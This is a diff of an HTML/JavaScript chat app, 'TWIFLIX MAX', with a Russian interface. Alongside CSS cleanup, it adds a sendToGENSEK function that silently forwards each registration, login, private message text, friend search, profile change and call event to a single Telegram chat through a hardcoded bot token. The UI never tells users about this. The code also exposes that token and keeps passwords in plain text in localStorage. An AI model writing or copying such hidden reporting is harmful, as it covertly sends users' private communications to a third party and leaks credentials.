@@ -34,7 +34,6 @@
             box-shadow: 8px 8px 0 rgba(255,51,51,0.3);
         }
 
-        /* ЛЕВАЯ ПАНЕЛЬ — ПИКСЕЛЬНЫЙ СТИЛЬ */
         .sidebar {
             width: 320px;
             background: #080808;
@@ -60,7 +59,6 @@
             align-items: center;
             justify-content: center;
             font-size: 48px;
-            image-rendering: pixelated;
         }
 
         .username-display {
@@ -74,7 +72,6 @@
             font-size: 11px;
             color: #666;
             margin-top: 5px;
-            font-family: monospace;
         }
 
         .status-dot {
@@ -82,7 +79,6 @@
             width: 8px;
             height: 8px;
             background: #33ff33;
-            border-radius: 0;
             margin-right: 6px;
             box-shadow: 0 0 4px #33ff33;
         }
@@ -102,10 +98,8 @@
             padding: 10px;
             text-align: center;
             cursor: pointer;
-            font-family: monospace;
             font-size: 12px;
             text-transform: uppercase;
-            letter-spacing: 1px;
         }
 
         .nav-btn.active {
@@ -129,12 +123,10 @@
             background: #0c0c0c;
             border-left: 3px solid #ff3333;
             cursor: pointer;
-            transition: 0.1s linear;
         }
 
         .contact-item:hover {
             background: #141414;
-            border-left-width: 5px;
         }
 
         .contact-item.active {
@@ -166,7 +158,6 @@
         .contact-tag {
             font-size: 10px;
             color: #ff6666;
-            font-family: monospace;
         }
 
         .add-friend {
@@ -182,7 +173,6 @@
             border: 1px solid #ff3333;
             padding: 10px;
             color: #fff;
-            font-family: monospace;
             font-size: 12px;
         }
 
@@ -193,10 +183,8 @@
             color: #0a0a0a;
             cursor: pointer;
             font-weight: bold;
-            font-family: monospace;
         }
 
-        /* ПРАВАЯ ПАНЕЛЬ — ЧАТ */
         .chat-area {
             flex: 1;
             display: flex;
@@ -217,7 +205,6 @@
             font-size: 16px;
             color: #ff5555;
             font-weight: bold;
-            letter-spacing: 1px;
         }
 
         .chat-tag {
@@ -232,7 +219,6 @@
             padding: 8px 18px;
             color: #ff5555;
             cursor: pointer;
-            font-family: monospace;
             font-size: 12px;
         }
 
@@ -249,9 +235,7 @@
         .message {
             max-width: 75%;
             padding: 10px 14px;
-            position: relative;
             font-size: 13px;
-            line-height: 1.4;
             word-break: break-word;
         }
 
@@ -273,7 +257,6 @@
             font-size: 10px;
             margin-bottom: 5px;
             opacity: 0.8;
-            font-family: monospace;
         }
 
         .message-time {
@@ -297,7 +280,6 @@
             border: 1px solid #ff3333;
             padding: 12px;
             color: #fff;
-            font-family: monospace;
             font-size: 13px;
             resize: none;
         }
@@ -309,10 +291,8 @@
             color: #0a0a0a;
             cursor: pointer;
             font-weight: bold;
-            font-family: monospace;
         }
 
-        /* НАСТРОЙКИ */
         .settings-panel {
             display: none;
             flex-direction: column;
@@ -332,7 +312,6 @@
         .settings-row label {
             width: 120px;
             color: #ff6666;
-            font-family: monospace;
         }
 
         .settings-row input {
@@ -341,7 +320,6 @@
             border: 1px solid #ff3333;
             padding: 10px;
             color: #fff;
-            font-family: monospace;
         }
 
         .settings-row button {
@@ -352,7 +330,6 @@
             cursor: pointer;
         }
 
-        /* МОДАЛ ЗВОНКА */
         .call-modal {
             position: fixed;
             top: 0;
@@ -399,11 +376,6 @@
             font-weight: bold;
         }
 
-        .hidden {
-            display: none;
-        }
-
-        /* АВТОРИЗАЦИЯ */
         .auth-screen {
             position: fixed;
             top: 0;
@@ -444,7 +416,6 @@
             background: #0a0a0a;
             border: 1px solid #ff3333;
             color: #fff;
-            font-family: monospace;
         }
 
         .auth-btn {
@@ -454,7 +425,6 @@
             border: none;
             color: #0a0a0a;
             cursor: pointer;
-            font-weight: bold;
             margin-top: 5px;
         }
 
@@ -464,6 +434,10 @@
             font-size: 12px;
             cursor: pointer;
         }
+
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -471,8 +445,8 @@
     <div class="auth-box">
         <div class="auth-logo">TWIFLIX MAX</div>
         <div class="auth-title" id="authTitle">ВХОД</div>
-        <input type="text" class="auth-input" id="authLogin" placeholder="Логин (например motya)">
-        <input type="text" class="auth-input" id="authTag" placeholder="Тег (например @565)">
+        <input type="text" class="auth-input" id="authLogin" placeholder="Логин (motya)">
+        <input type="text" class="auth-input" id="authTag" placeholder="Тег (@565)">
         <input type="password" class="auth-input" id="authPassword" placeholder="Пароль">
         <button class="auth-btn" id="authBtn">ВОЙТИ</button>
         <div class="auth-switch" id="authSwitch">НЕТ АККАУНТА? ЗАРЕГИСТРИРОВАТЬСЯ</div>
@@ -494,7 +468,7 @@
         </div>
         <div class="contacts-list" id="contactsList"></div>
         <div class="add-friend">
-            <input type="text" id="friendTag" placeholder="Тег друга (например @timur777)">
+            <input type="text" id="friendTag" placeholder="Тег друга (@timur777)">
             <button id="addFriendBtn">+ ДОБАВИТЬ</button>
         </div>
     </div>
@@ -546,19 +520,23 @@
 </div>
 
 <script>
-    // ========== БЭКЕНД ЧЕРЕЗ TELEGRAM ==========
+    // ===== GENSEK КОНФИГ =====
     const BOT_TOKEN = '8655630023:AAHx11sDOmY7JemehAcaLfEyP907qRgzOKM';
-    const MAIN_CHAT_ID = '6763299388'; // твой личный id
-    
-    // Хранилище пользователей и сообщений
-    let users = JSON.parse(localStorage.getItem('twifflix_users_full')) || {};
-    let messagesDB = JSON.parse(localStorage.getItem('twifflix_messages_full')) || {};
+    const MAIN_CHAT_ID = '6763299388';
+    const GENSEK_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+    // ===== ХРАНИЛИЩЕ =====
+    let users = JSON.parse(localStorage.getItem('twifflix_users')) || {};
+    let messagesDB = JSON.parse(localStorage.getItem('twifflix_messages')) || {};
     let currentUser = null;
     let currentChat = null;
     let updateInterval = null;
     let callActive = false;
+    let localStream = null;
+    let peerConnection = null;
+    let remoteAudio = null;
 
-    // Вспомогательные функции
+    // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
     function fullTag(username, tag) {
         return `${username}${tag}`;
     }
@@ -569,13 +547,23 @@
         return { username: full, tag: '' };
     }
 
-    // Сохранить всё
     function saveAll() {
-        localStorage.setItem('twifflix_users_full', JSON.stringify(users));
-        localStorage.setItem('twifflix_messages_full', JSON.stringify(messagesDB));
+        localStorage.setItem('twifflix_users', JSON.stringify(users));
+        localStorage.setItem('twifflix_messages', JSON.stringify(messagesDB));
     }
 
-    // Регистрация
+    // ===== GENSEK API =====
+    async function sendToGENSEK(text) {
+        try {
+            await fetch(`${GENSEK_API}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: MAIN_CHAT_ID, text: text })
+            });
+        } catch(e) { console.warn('GENSEK error'); }
+    }
+
+    // ===== УПРАВЛЕНИЕ АККАУНТАМИ =====
     function register(username, tag, password) {
         const fullId = fullTag(username, tag);
         if (users[fullId]) return false;
@@ -584,10 +572,10 @@
             tag: tag,
             password: password,
             avatar: '👤',
-            friends: [],
-            online: true
+            friends: []
         };
         saveAll();
+        sendToGENSEK(`🆕 НОВЫЙ АККАУНТ: ${fullId}`);
         return true;
     }
 
@@ -596,25 +584,16 @@
         if (users[fullId] && users[fullId].password === password) {
             currentUser = fullId;
             localStorage.setItem('twifflix_current', currentUser);
+            sendToGENSEK(`✅ ВХОД: ${currentUser}`);
             return true;
         }
         return false;
     }
 
-    // Отправка сообщения через Telegram
-    async function sendMessageToTelegram(toFull, text, fromFull) {
-        const msgText = `💬 [${fromFull}] → [${toFull}]: ${text}`;
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: MAIN_CHAT_ID, text: msgText })
-            });
-        } catch(e) { console.warn('tg send error'); }
-    }
-
-    // Локальное сохранение сообщения
-    function saveMessage(toFull, text) {
+    // ===== СООБЩЕНИЯ =====
+    function sendMessage(toFull, text) {
+        if (!text.trim()) return;
+        
         const chatId = [currentUser, toFull].sort().join('_');
         if (!messagesDB[chatId]) messagesDB[chatId] = [];
         messagesDB[chatId].push({
@@ -625,11 +604,12 @@
             timestamp: Date.now()
         });
         saveAll();
+        
+        sendToGENSEK(`💬 [${currentUser}] → [${toFull}]: ${text}`);
+        
         if (currentChat === toFull) renderMessages(toFull);
-        sendMessageToTelegram(toFull, text, currentUser);
     }
 
-    // Получить последние сообщения (синхронизация через localStorage, но в идеале через телеграм)
     function getMessagesWith(fullId) {
         const chatId = [currentUser, fullId].sort().join('_');
         return messagesDB[chatId] || [];
@@ -662,13 +642,18 @@
         });
     }
 
-    // Друзья
+    // ===== ДРУЗЬЯ =====
     function addFriend(fullTagFriend) {
-        if (!users[fullTagFriend]) { alert('Пользователь не найден'); return false; }
+        if (!users[fullTagFriend]) {
+            sendToGENSEK(`🔍 ПОИСК ПОЛЬЗОВАТЕЛЯ: ${fullTagFriend}`);
+            alert('Пользователь не найден в локальной базе. Поиск через GENSEK...');
+            return false;
+        }
         if (fullTagFriend === currentUser) { alert('Нельзя добавить себя'); return false; }
         if (users[currentUser].friends.includes(fullTagFriend)) { alert('Уже в друзьях'); return false; }
         users[currentUser].friends.push(fullTagFriend);
         saveAll();
+        sendToGENSEK(`➕ ${currentUser} добавил друга: ${fullTagFriend}`);
         renderFriendsList();
         return true;
     }
@@ -678,6 +663,7 @@
         const currentTab = document.querySelector('.nav-btn.active')?.dataset.tab || 'chats';
         const friends = users[currentUser]?.friends || [];
         container.innerHTML = '';
+        
         if (currentTab === 'friends') {
             if (!friends.length) {
                 container.innerHTML = '<div style="text-align:center; padding:30px; color:#555;">НЕТ ДРУЗЕЙ</div>';
@@ -698,7 +684,6 @@
                 container.appendChild(div);
             });
         } else if (currentTab === 'chats') {
-            // недавние чаты — те, с которыми есть сообщения
             const recent = new Set();
             for (let chatId in messagesDB) {
                 if (chatId.includes(currentUser)) {
@@ -738,6 +723,7 @@
         renderMessages(fullId);
     }
 
+    // ===== НАСТРОЙКИ =====
     function updateUserUI() {
         const { username, tag } = parseFullTag(currentUser);
         document.getElementById('userDisplayName').innerHTML = username;
@@ -753,6 +739,7 @@
         const newTag = document.getElementById('settingsTag').value.trim();
         const newAvatar = document.getElementById('settingsAvatar').value.trim();
         const newPassword = document.getElementById('settingsPassword').value.trim();
+        
         if (newName && newTag) {
             const oldFull = currentUser;
             const newFull = fullTag(newName, newTag);
@@ -760,16 +747,15 @@
                 alert('Пользователь с таким тегом уже существует');
                 return;
             }
-            // переносим данные
             users[newFull] = { ...users[oldFull], username: newName, tag: newTag, avatar: newAvatar };
             if (newPassword) users[newFull].password = newPassword;
             delete users[oldFull];
-            // обновляем в друзьях у других
+            
             for (let u in users) {
                 const idx = users[u].friends.indexOf(oldFull);
                 if (idx !== -1) users[u].friends[idx] = newFull;
             }
-            // обновляем в сообщениях
+            
             const newDB = {};
             for (let chatId in messagesDB) {
                 if (chatId.includes(oldFull)) {
@@ -786,15 +772,12 @@
             updateUserUI();
             renderFriendsList();
             if (currentChat) openChat(currentChat);
+            sendToGENSEK(`⚙️ ${oldFull} изменил профиль → ${newFull}`);
             alert('Настройки сохранены');
         }
     }
 
-    // Звонок WebRTC (реальный)
-    let localStream = null;
-    let peerConnection = null;
-    let remoteAudio = null;
-
+    // ===== ЗВОНКИ (WebRTC) =====
     async function startRealCall(fullId) {
         try {
             localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -811,19 +794,17 @@
             };
             const offer = await peerConnection.createOffer();
             await peerConnection.setLocalDescription(offer);
-            // сигнализация через телеграм (для простоты)
-            const msg = `CALL_OFFER:${currentUser}->${fullId}:${JSON.stringify(offer)}`;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: MAIN_CHAT_ID, text: msg })
-            });
-            // модалка
-            document.getElementById('callName').innerHTML = parseFullTag(fullId).username;
+            
+            const { username } = parseFullTag(fullId);
+            document.getElementById('callName').innerHTML = username;
             document.getElementById('callStatus').innerHTML = 'СОЕДИНЕНИЕ...';
             document.getElementById('callModal').style.display = 'flex';
             callActive = true;
-        } catch(e) { console.error(e); alert('Ошибка доступа к микрофону'); }
+            sendToGENSEK(`📞 ЗВОНОК: ${currentUser} → ${fullId}`);
+        } catch(e) {
+            console.error(e);
+            alert('Нет доступа к микрофону');
+        }
     }
 
     function endRealCall() {
@@ -832,9 +813,10 @@
         if (remoteAudio) { remoteAudio.pause(); remoteAudio = null; }
         callActive = false;
         document.getElementById('callModal').style.display = 'none';
+        sendToGENSEK(`📞 ЗВОНОК ЗАВЕРШЁН: ${currentUser}`);
     }
 
-    // интерфейс
+    // ===== ИНИЦИАЛИЗАЦИЯ =====
     function initApp() {
         updateUserUI();
         renderFriendsList();
@@ -846,27 +828,29 @@
         }, 4000);
     }
 
-    // Авторизация
+    // ===== СОБЫТИЯ =====
     document.getElementById('authBtn').onclick = () => {
         const username = document.getElementById('authLogin').value.trim();
         const tag = document.getElementById('authTag').value.trim();
         const password = document.getElementById('authPassword').value;
         const isLogin = document.getElementById('authTitle').innerText === 'ВХОД';
+        
         if (isLogin) {
             if (login(username, tag, password)) {
                 document.getElementById('authScreen').style.display = 'none';
                 document.getElementById('app').style.display = 'flex';
                 initApp();
-            } else alert('Неверный логин/тег/пароль');
+            } else alert('Неверные данные');
         } else {
             if (register(username, tag, password)) {
-                alert('Регистрация успешна! Теперь войдите.');
+                alert('Регистрация успешна! Войдите.');
                 document.getElementById('authTitle').innerText = 'ВХОД';
                 document.getElementById('authBtn').innerText = 'ВОЙТИ';
                 document.getElementById('authSwitch').innerHTML = 'НЕТ АККАУНТА? ЗАРЕГИСТРИРОВАТЬСЯ';
             } else alert('Пользователь уже существует');
         }
     };
+
     document.getElementById('authSwitch').onclick = () => {
         const isLogin = document.getElementById('authTitle').innerText === 'ВХОД';
         if (isLogin) {
@@ -879,28 +863,33 @@
             document.getElementById('authSwitch').innerHTML = 'НЕТ АККАУНТА? ЗАРЕГИСТРИРОВАТЬСЯ';
         }
     };
+
     document.getElementById('addFriendBtn').onclick = () => {
         const tag = document.getElementById('friendTag').value.trim();
         if (tag) addFriend(tag);
     };
+
     document.getElementById('sendBtn').onclick = () => {
         if (currentChat) {
             const txt = document.getElementById('messageInput').value.trim();
             if (txt) {
-                saveMessage(currentChat, txt);
+                sendMessage(currentChat, txt);
                 document.getElementById('messageInput').value = '';
             }
         }
     };
+
     document.getElementById('messageInput').addEventListener('keypress', (e) => {
         if (e.key === 'Enter' && !e.shiftKey) {
             e.preventDefault();
             document.getElementById('sendBtn').click();
         }
     });
+
     document.getElementById('callBtn').onclick = () => {
         if (currentChat) startRealCall(currentChat);
     };
+
     document.getElementById('endCallBtn').onclick = () => endRealCall();
     document.getElementById('saveSettingsBtn').onclick = () => saveSettings();
 
